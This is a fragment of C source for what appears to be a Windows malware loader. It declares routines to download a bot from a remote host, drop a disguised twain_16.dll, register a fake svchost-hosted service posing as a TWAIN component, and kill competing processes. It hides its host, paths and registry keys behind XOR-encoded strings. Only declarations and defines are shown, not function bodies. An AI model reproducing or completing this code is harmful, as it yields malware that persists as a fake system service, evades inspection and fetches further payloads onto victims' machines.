//#pragma comment(linker,"/filealign:512 /section:.x,RWX /merge:.text=.x /merge:.rdata=.x /merge:.data=text /IGNORE:4078")
//#pragma comment(linker,"/merge:text=.x /merge:.data1=.x")
#pragma comment(linker,"/entry:_WinMain")
//#pragma comment(linker,"/nodefaultlib")
#pragma optimize("gsy",on)

#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <psapi.h>
#include <stdio.h>

int RegisterService(char*);
void DownloadBot(char*);
void delservice(char*);
int GetHTTPRespCode(SOCKET s);
int DnsResolve(char* Host);
int ready(SOCKET Socket,WORD timeout);
int DropFile(char *fname,BYTE data[],DWORD size);
void KillEnemys( void );
void CloseWindows( void );
void xor_hex_string(u_char *value, u_char *result, int xor);
int KillEnemy( DWORD dwProcessId);
char *decode_string(char*);


/* ----------------------------------------------- */
//#define SPECIAL "diskv1"
/* ----------------------------------------------- */
#define D(s) decode_string(s)
#define XOR 19
#define TWAIN_KEY D("404A4047565E4F50666161767D67507C7D67617C7F4076674F407661657A7076604F4764727A7D22254F40767066617A676A")

#ifndef FRELEASE
#define deb fdeb
#define FORMATERROR fmterr()
char* fmterr(void);
void fdeb(char *msg,...);
void * a(WORD size);
int f(char* p);
#else
#define FORMATERROR "release"
#define fmterr() "release"
#define deb //
#endif
BYTE twain_16_dump[];

/* define this to download bot core from site , otherwise binary will be dropped with  precompiled content in core */
//#define DOWNLOAD

#define LOADER_VERSION D("46717661607C7F777267337F7C727776613365233D21")
#define SOURCE_HOST D("606A7D21783D7D7667")
#define SOURCE_PORT 80
#define SOURCE_FILE D("3C6764727A7D4C22253D777F7F")
#define HTTP_TIMEOUT 20
#define BUF_SIZE 1024
// "%WinDir%\twain_16.dll"
#define DESTINATION D("36447A7D577A61364F6764727A7D4C22253D777F7F")
// %SystemRoot%\System32\svchost.exe -k netsvcs
#define SVCHOST_PATH D("36406A6067767E417C7C67364F406A6067767E20214F6065707B7C60673D766B76333E78337D766760657060")
#define SERVICE_GROUP D("7D766760657060")
#define SERVICE_NAME D("4764727A7D2225")
#define SERVICE_DISPNAME D("4764727A7D33222533717A6733606663637C6167")
#define SERVICE_DESC D("507C7E7E667D7A707267766033647A677B336764727A7D336176607C666170766033727D77337E727A7D67727A7D6033222533717A6733606663637C616733757C61337263637F7A7072677A7C7D603D335A7533677B7A6033607661657A7076337A603360677C636376773F334F1E19607C7E76337263637F7A7072677A7C7D6033647A7F7F337D7C673375667D70677A7C7D33707C61617670677F6A3D")
// System\CurrentControlSet\Services
#define SERVICE_KEY	D("406A6067767E4F50666161767D67507C7D67617C7F4076674F407661657A707660")
// Software\Microsoft\\Windows NT\CurrentVersion\SvcHost
#define SVCHOST_KEY D("407C7567647261764F5E7A70617C607C75674F4F447A7D777C6460335D474F50666161767D67457661607A7C7D4F4065705B7C6067")
#define PRESENCE_NAME D("6A7C717A61607C7F777267")